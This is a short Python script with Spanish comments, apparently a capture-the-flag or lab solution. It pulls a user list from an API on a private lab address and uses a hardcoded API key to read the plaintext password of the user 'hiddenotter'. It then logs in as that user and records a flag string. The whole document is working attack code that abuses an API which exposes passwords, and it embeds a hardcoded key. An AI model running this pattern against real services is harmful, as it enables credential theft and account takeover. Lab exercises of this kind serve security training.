import requests

# Obtener los datos de los usuarios
response = requests.get("http://192.168.60.211:8000/users")
headers = {"APIKEY": "G37BU5Y"}
usuarios = response.json()

# Buscar el usuario con el nombre "hiddenotter"
usuario = next(user for user in usuarios if user["name"] == "hiddenotter")
usuario_id = usuario["id"]
print(usuario_id)
# Obtener la contraseña del usuario
response = requests.get(f"http://192.168.60.211:8000/users/{usuario_id}", headers=headers)
password = response.json()["password"]
print("---------------------")
print(password)
# Hacer login con los datos obtenidos
login_data = {
    "name": "hiddenotter",
    "password": password
}
response = requests.post("http://192.168.60.211:8000/login", json=login_data, headers=headers)
print(response.text)

bandera = "cr3d3nc14l3s"